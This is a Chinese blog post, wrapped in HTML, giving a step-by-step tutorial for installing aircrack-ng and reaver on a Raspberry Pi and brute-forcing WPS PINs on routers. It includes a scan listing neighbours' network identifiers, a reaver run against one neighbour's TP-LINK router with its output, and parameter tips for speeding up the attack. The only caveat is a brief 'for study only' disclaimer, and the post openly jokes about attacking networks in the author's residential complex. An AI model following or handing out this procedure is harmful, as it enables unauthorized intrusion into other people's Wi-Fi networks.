@@ -1,0 +1,144 @@
+<!DOCTYPE html>
+<html>
+
+<head>
+  <meta http-equiv="Content-Type" content="text/html" charset="UTF-8" >
+  <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1"/>
+  <title>Raspberry Pi下跑aircrack和reaver破解路由器PIN码 | Blog of Secer</title>
+  <meta name="description" content="" />
+  <meta name="HandheldFriendly" content="True" />
+  <meta name="MobileOptimized" content="320" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <link rel="stylesheet" type="text/css" href="/css/screen.css" />
+  <link rel="stylesheet" type="text/css" href="/css/style.css" />
+  <meta name="generator" content="Blog of Secer">
+
+  
+  
+  
+
+  
+</head>
+
+<!--
+<body class="post-template">
+-->
+<body class="home-template">
+<div id="perspective" class="perspective effect-movedown">
+  <div class="container">
+    <!-- wrapper -->
+    <div class="wrapper">
+
+      <header class="site-head"  style="background: #24282b url(/img/img-bg.jpg) 0 -20%" >
+    <div class="vertical">
+        <div class="site-head-content inner">
+             <a class="blog-logo" href="/"><img src="/img/logo.svg" alt="Blog Logo"/></a> 
+            <h1 class="blog-title">Blog of Secer</h1>
+            <h2 class="blog-description"><button id="showMenu">Show Menu</button></h2>
+        </div>
+    </div>
+</header>
+
+      
+
+<main class="content" role="main">
+  <article class="post">
+    <span class="post-meta">
+      <time datetime="2012-12-27T19:04:05.000Z" itemprop="datePublished">
+          2012-12-28
+      </time>
+    
+</span>
+    <h1 class="post-title">Raspberry Pi下跑aircrack和reaver破解路由器PIN码</h1>
+    <section class="post-content">
+      <p>minyoni@FreeBuf   <br>声明：本文仅供安全学习用途 最近心血来潮，想把小区里的无线信号测试个遍。基于目前大多数路由器都支持wps,想必各位基友们都知道aircrack和reaver这两个工具，实属破解pin码，杀人越货，居家旅行之必备良药。像以前跑reaver这样的暴力工具一般都要24小时开着主机，实在浪费功耗，灰常的不绿色！不环保！    <br>话说Raspberry Pi，作为一个攻击环境也是灰常给力的。国外的发烧友们已经针对这个板子，改造了专门用于网络攻击和测试的系统（基于debian） 不过今天这篇文章说的是如何在Raspberry Pi的官方发行版上安装aircrack和reaver ，我用的是苹果充电器+Mini usb 数据线给Raspberry Pi供电，带一个alfa的无线网卡足够了。功耗如此之低，实在是在线跑pin码。长期无线抓包的绝佳方案呢。</p>  <p>PS:懂得可以路过了…… 废话不多说，安装过程如下</p>  <p>1.准备系统环境   <br></p>  <p>apt-get install -y libpcap-dev libsqlite3-dev sqlite3 libpcap0.8-dev libssl-dev build-essential iw tshark subversion</p>  <p>&#160;</p>  <p>2.安装aircrack   <br></p>  <p>svn co <a href="http://trac.aircrack-ng.org/svn/trunk" target="_blank" rel="external">http://trac.aircrack-ng.org/svn/trunk</a> aircrack-ng    <br>cd aircrack-ng/    <br>make    <br>make install    <br>cd ../</p>  <p>&#160;</p>  <p>3.安装reaver   <br></p>  <p>wget <a href="http://reaver-wps.googlecode.com/files/reaver-1.4.tar.gz" target="_blank" rel="external">http://reaver-wps.googlecode.com/files/reaver-1.4.tar.gz</a>    <br>tar zxvf reaver-1.4.tar.gz    <br>cd reaver-1.4/src    <br>./configure    <br>make    <br>make install    <br>cd ../</p>  <p>&#160;</p>  <p>4.使用 aircrack，寻找附近开启wps的路由器，邪恶……嘻嘻   <br></p>  <p>airmon-ng start wlan0   <br>airodump-ng mon0    <br>CH 11 ][ Elapsed: 36 s ][ 2012-12-18 04:46    <br> BSSID&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160; PWR&#160; Beacons&#160;&#160;&#160; #Data, #/s&#160; CH&#160; MB&#160;&#160; ENC&#160; CIPHER AUTH ESSID    <br> 00:0E:2E:FD:C4:BB&#160;&#160; -1&#160;&#160;&#160;&#160;&#160;&#160;&#160; 0&#160;&#160;&#160;&#160;&#160;&#160;&#160; 0&#160;&#160;&#160; 0&#160; -1&#160; -1&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160; &amp;lt;length:&#160; 0&amp;gt;    <br> 4C:E6:76:60:3F:20&#160; -13&#160;&#160;&#160;&#160;&#160; 123&#160;&#160;&#160;&#160;&#160;&#160;&#160; 0&#160;&#160;&#160; 0&#160; 11&#160; 54e&#160; WPA2 CCMP&#160;&#160; PSK&#160; cuier-1    <br> B0:48:7A:52:F4:72&#160; -23&#160;&#160;&#160;&#160;&#160;&#160; 42&#160;&#160;&#160;&#160;&#160;&#160;&#160; 0&#160;&#160;&#160; 0&#160;&#160; 1&#160; 54e. WPA2 CCMP&#160;&#160; PSK&#160; FAST_52F472    <br> 8C:21:0A:5F:A2:FA&#160; -35&#160;&#160;&#160;&#160;&#160;&#160; 28&#160;&#160;&#160;&#160;&#160;&#160;&#160; 0&#160;&#160;&#160; 0&#160;&#160; 1&#160; 54e. WPA2 CCMP&#160;&#160; PSK&#160; TP-LINK_5FA2FA    <br> E0:05:C5:D3:3F:00&#160; -42&#160;&#160;&#160;&#160;&#160;&#160; 33&#160;&#160;&#160;&#160;&#160;&#160;&#160; 0&#160;&#160;&#160; 0&#160;&#160; 2&#160; 54e. WPA2 CCMP&#160;&#160; PSK&#160; TP-LINK_D33F00    <br> EC:17:2F:7D:12:1E&#160; -49&#160;&#160;&#160;&#160;&#160;&#160; 56&#160;&#160;&#160;&#160;&#160;&#160;&#160; 1&#160;&#160;&#160; 0&#160;&#160; 6&#160; 54e. WPA2 CCMP&#160;&#160; PSK&#160; wg7788    <br> B0:48:7A:5D:22:EA&#160; -51&#160;&#160;&#160;&#160;&#160;&#160; 36&#160;&#160;&#160;&#160;&#160;&#160;&#160; 0&#160;&#160;&#160; 0&#160;&#160; 6&#160; 54e. WPA2 CCMP&#160;&#160; PSK&#160; TP-LINK_1202    <br> C4:CA:D9:6D:6F:B0&#160; -52&#160;&#160;&#160;&#160;&#160;&#160; 30&#160;&#160;&#160;&#160;&#160;&#160; 10&#160;&#160;&#160; 0&#160; 11&#160; 54e. OPN&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160; ChinaNet    <br> 8C:21:0A:8F:2F:1A&#160; -54&#160;&#160;&#160;&#160;&#160;&#160; 18&#160;&#160;&#160;&#160;&#160;&#160;&#160; 0&#160;&#160;&#160; 0&#160;&#160; 1&#160; 54e. WPA2 CCMP&#160;&#160; PSK&#160; hechengyv    <br> E0:05:C5:C5:70:E8&#160; -55&#160;&#160;&#160;&#160;&#160;&#160; 15&#160;&#160;&#160;&#160;&#160;&#160;&#160; 0&#160;&#160;&#160; 0&#160;&#160; 4&#160; 54e. WPA2 CCMP&#160;&#160; PSK&#160; wtangqiu    <br> C8:3A:35:55:D1:D8&#160; -55&#160;&#160;&#160;&#160;&#160;&#160; 20&#160;&#160;&#160;&#160;&#160;&#160;&#160; 2&#160;&#160;&#160; 0&#160;&#160; 7&#160; 54e. WPA&#160; CCMP&#160;&#160; PSK&#160; Tenda_55D1D8    <br> 8C:21:0A:84:89:8C&#160; -56&#160;&#160;&#160;&#160;&#160;&#160; 24&#160;&#160;&#160;&#160;&#160;&#160;&#160; 0&#160;&#160;&#160; 0&#160;&#160; 1&#160; 54e. WPA2 CCMP&#160;&#160; PSK&#160; BATE    <br> C4:CA:D9:6D:5F:60&#160; -55&#160;&#160;&#160;&#160;&#160;&#160; 15&#160;&#160;&#160;&#160;&#160;&#160;&#160; 2&#160;&#160;&#160; 0&#160;&#160; 6&#160; 54e. OPN&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160; ChinaNet    <br> EC:17:2F:54:01:2E&#160; -56&#160;&#160;&#160;&#160;&#160;&#160; 13&#160;&#160;&#160;&#160;&#160;&#160;&#160; 0&#160;&#160;&#160; 0&#160;&#160; 1&#160; 54e. WPA2 CCMP&#160;&#160; PSK&#160; diguadawang    <br> 5C:63:BF:74:56:52&#160; -53&#160;&#160;&#160;&#160;&#160;&#160; 18&#160;&#160;&#160;&#160;&#160;&#160;&#160; 2&#160;&#160;&#160; 0&#160;&#160; 1&#160; 54e. WPA2 CCMP&#160;&#160; PSK&#160; cocohe    <br> 08:10:76:40:C2:92&#160; -58&#160;&#160;&#160;&#160;&#160;&#160; 21&#160;&#160;&#160;&#160;&#160;&#160;&#160; 0&#160;&#160;&#160; 0&#160;&#160; 1&#160; 54e&#160; WPA2 CCMP&#160;&#160; PSK&#160; flytv    <br> E0:05:C5:C0:60:42&#160; -56&#160;&#160;&#160;&#160;&#160;&#160; 21&#160;&#160;&#160;&#160;&#160;&#160;&#160; 0&#160;&#160;&#160; 0&#160;&#160; 9&#160; 54e. WPA2 CCMP&#160;&#160; PSK&#160; HZLYL    <br> 38:83:45:C1:BE:F8&#160; -59&#160;&#160;&#160;&#160;&#160;&#160; 14&#160;&#160;&#160;&#160;&#160;&#160;&#160; 1&#160;&#160;&#160; 0&#160;&#160; 6&#160; 54e. WPA2 CCMP&#160;&#160; PSK&#160; TICO081122    <br> C4:CA:D9:74:B3:80&#160; -57&#160;&#160;&#160;&#160;&#160;&#160; 13&#160;&#160;&#160;&#160;&#160;&#160;&#160; 1&#160;&#160;&#160; 0&#160; 11&#160; 54e. OPN&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160; ChinaNet    <br> EC:88:8F:AB:F6:5E&#160; -59&#160;&#160;&#160;&#160;&#160;&#160;&#160; 5&#160;&#160;&#160;&#160;&#160;&#160;&#160; 0&#160;&#160;&#160; 0&#160;&#160; 4&#160; 54e. WPA2 CCMP&#160;&#160; PSK&#160; TP-LINK_ABF65E    <br> 6C:E8:73:B0:67:78&#160; -59&#160;&#160;&#160;&#160;&#160;&#160;&#160; 8&#160;&#160;&#160;&#160;&#160;&#160;&#160; 0&#160;&#160;&#160; 0&#160;&#160; 6&#160; 54e. WPA2 CCMP&#160;&#160; PSK&#160; WJJ~LOVE~WW    <br> C8:3A:35:19:D6:78&#160; -61&#160;&#160;&#160;&#160;&#160;&#160;&#160; 9&#160;&#160;&#160;&#160;&#160;&#160;&#160; 0&#160;&#160;&#160; 0&#160;&#160; 1&#160; 54e&#160; WPA&#160; CCMP&#160;&#160; PSK&#160; Tenda_19D678    <br> E0:05:C5:19:9C:04&#160; -61&#160;&#160;&#160;&#160;&#160;&#160; 18&#160;&#160;&#160;&#160;&#160;&#160;&#160; 0&#160;&#160;&#160; 0&#160;&#160; 7&#160; 54 . WPA2 CCMP&#160;&#160; PSK&#160; 1-14-1-602    <br> C8:64:C7:5A:46:16&#160; -60&#160;&#160;&#160;&#160;&#160;&#160;&#160; 3&#160;&#160;&#160;&#160;&#160;&#160;&#160; 0&#160;&#160;&#160; 0&#160; 11&#160; 54e&#160; WPA&#160; CCMP&#160;&#160; PSK&#160; STB_CDCF    <br> 6C:E8:73:45:A7:E6&#160; -60&#160;&#160;&#160;&#160;&#160;&#160;&#160; 6&#160;&#160;&#160;&#160;&#160;&#160;&#160; 0&#160;&#160;&#160; 0&#160;&#160; 4&#160; 54e. WPA2 CCMP&#160;&#160; PSK&#160; TP-LINK_45A7E6    <br> 1C:BD:B9:F5:E5:D7&#160; -61&#160;&#160;&#160;&#160;&#160;&#160; 16&#160;&#160;&#160;&#160;&#160;&#160;&#160; 0&#160;&#160;&#160; 0&#160;&#160; 1&#160; 54&#160;&#160; WPA2 CCMP&#160;&#160; PSK&#160; D-Link_DIR-600M    <br> C4:CA:D9:6D:6E:B0&#160; -61&#160;&#160;&#160;&#160;&#160;&#160; 12&#160;&#160;&#160;&#160;&#160;&#160;&#160; 0&#160;&#160;&#160; 0&#160;&#160; 1&#160; 54e. OPN&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160; ChinaNet    <br> C8:64:C7:5A:46:15&#160; -61&#160;&#160;&#160;&#160;&#160;&#160; 17&#160;&#160;&#160;&#160;&#160;&#160;&#160; 0&#160;&#160;&#160; 0&#160; 11&#160; 54e&#160; WPA&#160; CCMP&#160;&#160; PSK&#160; VIDEOPHONE_CDCF    <br> C8:64:C7:5A:46:17&#160; -61&#160;&#160;&#160;&#160;&#160;&#160; 12&#160;&#160;&#160;&#160;&#160;&#160;&#160; 0&#160;&#160;&#160; 0&#160; 11&#160; 54e&#160; WPA&#160; CCMP&#160;&#160; PSK&#160; BACKUP    <br> EC:88:8F:99:75:F2&#160; -61&#160;&#160;&#160;&#160;&#160;&#160;&#160; 5&#160;&#160;&#160;&#160;&#160;&#160;&#160; 0&#160;&#160;&#160; 0&#160;&#160; 4&#160; 54e. WPA2 CCMP&#160;&#160; PSK&#160; 6786    <br> 8C:21:0A:1E:60:26&#160; -61&#160;&#160;&#160;&#160;&#160;&#160;&#160; 3&#160;&#160;&#160;&#160;&#160;&#160;&#160; 0&#160;&#160;&#160; 0&#160;&#160; 1&#160; 54e. WPA2 CCMP&#160;&#160; PSK&#160; yue    <br> 00:23:CD:5B:A7:9E&#160; -61&#160;&#160;&#160;&#160;&#160;&#160;&#160; 2&#160;&#160;&#160;&#160;&#160;&#160;&#160; 0&#160;&#160;&#160; 0&#160;&#160; 6&#160; 54 . WEP&#160; WEP&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160; 1203 wireless    <br> 14:E6:E4:44:9B:8E&#160; -62&#160;&#160;&#160;&#160;&#160;&#160;&#160; 6&#160;&#160;&#160;&#160;&#160;&#160;&#160; 0&#160;&#160;&#160; 0&#160;&#160; 4&#160; 54e. WPA2 CCMP&#160;&#160; PSK&#160; bujiankai    <br> 00:1D:0F:81:72:06&#160; -62&#160;&#160;&#160;&#160;&#160;&#160;&#160; 4&#160;&#160;&#160;&#160;&#160;&#160;&#160; 0&#160;&#160;&#160; 0&#160;&#160; 6&#160; 54 . WEP&#160; WEP&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160; Line    <br> FC:C8:97:94:B6:C8&#160; -62&#160;&#160;&#160;&#160;&#160;&#160;&#160; 7&#160;&#160;&#160;&#160;&#160;&#160;&#160; 0&#160;&#160;&#160; 0&#160; 11&#160; 54e&#160; WPA&#160; CCMP&#160;&#160; PSK&#160; CU_6cmn    <br> B0:48:7A:2A:1B:E6&#160; -62&#160;&#160;&#160;&#160;&#160;&#160;&#160; 7&#160;&#160;&#160;&#160;&#160;&#160;&#160; 0&#160;&#160;&#160; 0&#160;&#160; 6&#160; 54e. WPA&#160; CCMP&#160;&#160; PSK&#160; 302    <br> EC:88:8F:8F:CD:BB&#160; -62&#160;&#160;&#160;&#160;&#160;&#160; 11&#160;&#160;&#160;&#160;&#160;&#160;&#160; 0&#160;&#160;&#160; 0&#160; 11&#160; 54e. WPA2 CCMP&#160;&#160; PSK&#160; haloso2    <br> EC:17:2F:AC:44:A2&#160; -62&#160;&#160;&#160;&#160;&#160;&#160;&#160; 7&#160;&#160;&#160;&#160;&#160;&#160;&#160; 0&#160;&#160;&#160; 0&#160;&#160; 1&#160; 54e. WPA2 CCMP&#160;&#160; PSK&#160; 1-401    <br> C8:64:C7:5A:46:14&#160; -63&#160;&#160;&#160;&#160;&#160;&#160; 24&#160;&#160;&#160;&#160;&#160;&#160;&#160; 0&#160;&#160;&#160; 0&#160; 11&#160; 54e&#160; WPA&#160; CCMP&#160;&#160; PSK&#160; CU_CDCF    <br> 38:83:45:B5:E3:96&#160; -63&#160;&#160;&#160;&#160;&#160;&#160;&#160; 6&#160;&#160;&#160;&#160;&#160;&#160;&#160; 0&#160;&#160;&#160; 0&#160;&#160; 1&#160; 54e. WPA2 CCMP&#160;&#160; PSK&#160; TP-LINK_B5E396    <br> C8:3A:35:2B:35:68&#160; -63&#160;&#160;&#160;&#160;&#160;&#160; 11&#160;&#160;&#160;&#160;&#160;&#160;&#160; 0&#160;&#160;&#160; 0&#160; 11&#160; 54e&#160; WPA2 CCMP&#160;&#160; PSK&#160; Tenda_2B3568    <br> 00:27:19:6D:4A:5A&#160; -63&#160;&#160;&#160;&#160;&#160;&#160;&#160; 1&#160;&#160;&#160;&#160;&#160;&#160;&#160; 0&#160;&#160;&#160; 0&#160; 11&#160; 54e. WPA2 CCMP&#160;&#160; PSK&#160; JUJIA-FOGUANG    <br> FC:C8:97:94:B6:CB&#160; -65&#160;&#160;&#160;&#160;&#160;&#160;&#160; 9&#160;&#160;&#160;&#160;&#160;&#160;&#160; 0&#160;&#160;&#160; 0&#160; 11&#160; 54e&#160; WPA&#160; CCMP&#160;&#160; PSK&#160; BACKUP    <br> FC:C8:97:94:B6:C9&#160; -63&#160;&#160;&#160;&#160;&#160;&#160; 15&#160;&#160;&#160;&#160;&#160;&#160;&#160; 0&#160;&#160;&#160; 0&#160; 11&#160; 54e&#160; WPA&#160; CCMP&#160;&#160; PSK&#160; VIDEOPHONE_6cmn    <br> C8:3A:35:06:63:B0&#160; -64&#160;&#160;&#160;&#160;&#160;&#160;&#160; 3&#160;&#160;&#160;&#160;&#160;&#160;&#160; 0&#160;&#160;&#160; 0&#160;&#160; 1&#160; 54e&#160; WPA2 CCMP&#160;&#160; PSK&#160; Tenda_0663B0    <br> 8C:21:0A:B0:22:92&#160; -64&#160;&#160;&#160;&#160;&#160;&#160;&#160; 3&#160;&#160;&#160;&#160;&#160;&#160;&#160; 0&#160;&#160;&#160; 0&#160;&#160; 1&#160; 54e. WPA2 CCMP&#160;&#160; PSK&#160; 810    <br> 14:E6:E4:4F:DE:FE&#160; -64&#160;&#160;&#160;&#160;&#160;&#160;&#160; 3&#160;&#160;&#160;&#160;&#160;&#160;&#160; 0&#160;&#160;&#160; 0&#160;&#160; 1&#160; 54e. WPA2 CCMP&#160;&#160; PSK&#160; YM+ZM    <br> FC:C8:97:94:B6:CA&#160; -65&#160;&#160;&#160;&#160;&#160;&#160; 13&#160;&#160;&#160;&#160;&#160;&#160;&#160; 0&#160;&#160;&#160; 0&#160; 11&#160; 54e&#160; WPA&#160; CCMP&#160;&#160; PSK&#160; STB_6cmn    <br> C8:3A:35:52:70:60&#160; -65&#160;&#160;&#160;&#160;&#160;&#160;&#160; 2&#160;&#160;&#160;&#160;&#160;&#160;&#160; 0&#160;&#160;&#160; 0&#160; 11&#160; 54e. WPA&#160; CCMP&#160;&#160; PSK&#160; Tenda_527060    <br> 00:26:5A:B3:08:7E&#160; -65&#160;&#160;&#160;&#160;&#160;&#160;&#160; 8&#160;&#160;&#160;&#160;&#160;&#160;&#160; 0&#160;&#160;&#160; 0&#160; 13&#160; 54e&#160; WPA2 CCMP&#160;&#160; PSK&#160; 503    <br> F4:EC:38:56:6B:DE&#160; -62&#160;&#160;&#160;&#160;&#160;&#160;&#160; 2&#160;&#160;&#160;&#160;&#160;&#160;&#160; 0&#160;&#160;&#160; 0&#160;&#160; 9&#160; 54e. WPA2 CCMP&#160;&#160; PSK&#160; WTO    <br> 14:D6:4D:A0:19:60&#160; -62&#160;&#160;&#160;&#160;&#160;&#160;&#160; 3&#160;&#160;&#160;&#160;&#160;&#160;&#160; 0&#160;&#160;&#160; 0&#160; 11&#160; 54e&#160; WPA2 TKIP&#160;&#160; PSK&#160; wang~XB    <br> C4:CA:D9:6D:6F:40&#160; -62&#160;&#160;&#160;&#160;&#160;&#160;&#160; 1&#160;&#160;&#160;&#160;&#160;&#160;&#160; 0&#160;&#160;&#160; 0&#160;&#160; 1&#160; 54e. OPN&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160; ChinaNet ctrl+c^&#160; </p>  <p>结束 话说小区里的无线信号还真是多呢……主要是alfa 的卡给力……呵呵 5.使用reaver 破解开启wps功能的路由器密码 比如这条，信号还不错   <br></p>  <p>8C:21:0A:5F:A2:FA -35 28 0 0 1 54e. WPA2 CCMP PSK TP-LINK_5FA2FA   <br></p>  <p>root@home:~/soft/reaver-1.4#&#160; reaver&#160; -i&#160; mon0&#160; -b 8C:21:0A:5F:A2:FA&#160; -a&#160; -S&#160; -vv&#160; -d2&#160; -t 5 -c 1   <br>Reaver v1.4 WiFi Protected Setup Attack Tool    <br>Copyright (c) 2011, Tactical Network Solutions, Craig Heffner &amp;lt;cheffner@tacnetsol.com&amp;gt;    <br>[+] Switching mon0 to channel 1    <br>[+] Waiting for beacon from 8C:21:0A:5F:A2:FA    <br>[+] Associated with 8C:21:0A:5F:A2:FA (ESSID: TP-LINK_5FA2FA)    <br>[+] Trying pin 12345670    <br>[+] Sending EAPOL START request    <br>[+] Received identity request    <br>[+] Sending identity response    <br>[+] Received M1 message    <br>[+] Sending M2 message    <br>[+] Received M3 message    <br>[+] Sending M4 message    <br>[+] Received WSC NACK    <br>[+] Sending WSC NACK    <br>[+] Trying pin 00005678    <br>[+] Sending EAPOL START request    <br>[+] Received identity request    <br>[+] Sending identity response    <br>[+] Received M1 message    <br>[+] Sending M2 message    <br>[+] Received M3 message    <br>[+] Sending M4 message    <br>[+] Received WSC NACK    <br>[+] Sending WSC NACK    <br>[+] Trying pin 01235678    <br>[+] Sending EAPOL START request    <br>[+] Received identity request    <br>[+] Sending identity response    <br>[+] Received M1 message    <br>[+] Sending M2 message    <br>[+] Received M3 message    <br>[+] Sending M4 message    <br>[+] Received WSC NACK    <br>[+] Sending WSC NACK    <br>[+] Trying pin 11115670    <br>[+] Sending EAPOL START request    <br>[+] Received identity request    <br>[+] Sending identity response    <br>[+] Received M1 message    <br>[+] Sending M2 message    <br>^C</p>  <p>&#160;</p>  <p>这样就开始破解了哦，耐心等待结果就好了……不要太邪恶哦。做做测试还是可以的，要做个好童鞋…… </p>  <p>########################################################################## 附上reaver调整参数的一些小技巧   <br>reaver:    <br>-i 监听后接口名称    <br>-b 目标mac地址    <br>-a 自动检测目标AP最佳配置    <br>-S 使用最小的DH key（可以提高PJ速度）    <br>-vv 显示更多的非严重警告    <br>-d 即delay每穷举一次的闲置时间 预设为1秒    <br>-t 即timeout每次穷举等待反馈的最长时间    <br>-c指定频道可以方便找到信号，如-c1 指定1频道，大家查看自己的目标频道做相应修改 （非TP-LINK路由推荐–d9 –t9参数防止路由僵死    <br>示例：    <br>reaver -i mon0 -b MAC -a -S –d9 –t9 -vv）    <br>应因状况调整参数（-c后面都已目标频道为1作为例子）    <br>目标信号非常好: reaver -i mon0 -b MAC -a -S -vv -d0 -c 1    <br>目标信号普通: reaver -i mon0 -b MAC -a -S -vv -d2 -t 5 -c 1    <br>目标信号一般: reaver -i mon0 -b MAC -a -S -vv -d5 -c 1</p>
+    </section>
+    <footer class="post-footer">
+      <section class="author">
+    <h4>Secer</h4>
+    <p>记录互联网安全历程与个人成长经历</p>
+</section>
+      <section class="share">
+    <h4>Share this post</h4>
+    <a class="icon-sina-weibo" href="http://v.t.sina.com.cn/share/share.php?title=记录互联网安全历程与个人成长经历 ?url=http://ha.cker.in/961.seo/" target="_blank">
+        <span class="hidden">weibo</span>
+    </a>
+    <a class="icon-twitter" href="http://twitter.com/share?url=http://ha.cker.in/961.seo/"
+       onclick="window.open(this.href, 'twitter-share', 'width=550,height=235');return false;">
+        <span class="hidden">Twitter</span>
+    </a>
+    <a class="icon-facebook" href="https://www.facebook.com/sharer/sharer.php?u=http://ha.cker.in/961.seo/"
+       onclick="window.open(this.href, 'facebook-share','width=580,height=296');return false;">
+        <span class="hidden">Facebook</span>
+    </a>
+    <a class="icon-google-plus" href="https://plus.google.com/share?url=http://ha.cker.in/961.seo/"
+       onclick="window.open(this.href, 'google-plus-share', 'width=490,height=530');return false;">
+        <span class="hidden">Google+</span>
+    </a>
+</section>
+
+    </footer>
+  </article>
+  <nav class="pagination" role="pagination">
+    
+    <a class="newer-posts" href="/962.seo/">
+        ← 代码审计：ECShop V2.7.3 GBK release1106注入0day及修复
+    </a>
+    
+    <span class="icon-logo">•</span>
+    
+    <a class="older-posts" href="/960.seo/">
+        AspCms_v1.5_20110517 SQL注射 →
+    </a>
+    
+</nav>
+
+  <div id="comment" class="comments-area">
+    <h4 class="title"><a href="#disqus_comments" name="disqus_comments">Comments</a></h4>
+    
+</div>
+
+</main>
+
+
+      
+<footer class="site-footer">
+  
+  <div class="inner">
+     <section class="copyright">All content copyright <a href="/">Blog of Secer</a> &copy; 2014 &bull; All rights reserved.</section>
+     <section class="poweredby">Proudly published with <a class="icon-ghost" href="http://zespia.tw/hexo/">Hexo</a></section>
+  </div>
+</footer>
+
+      <script src="//ajax.googleapis.com/ajax/libs/jquery/2.0.3/jquery.min.js"></script>
+
+<script type="text/javascript" src="/js/jquery.fitvids.js"></script>
+<script type="text/javascript" src="/js/index.js"></script>
+<script type="text/javascript" src="/js/menu.js"></script>
+
+
+
+
+
+  </div>
+</div>
+
+<nav  class="outer-nav top horizontal">
+
+          <a class="icon-home"  href="/"><span>Home</span></a>
+
+          <a class="icon-news"  href="/archives"><span>Archive</span></a>
+
+          <a class="icon-image"  href="/images"><span>Images</span></a>
+
+          <a class="icon-wiki"  href="/wiki/"><span>Wiki</span></a>
+
+          <a class="icon-Favorites"  href="/favorites"><span>Favorites</span></a>
+
+          <a class="icon-mail"  href="/about/"><span>Contact</span></a>
+
+</nav>
+
+</div>
+</body>
+</html>
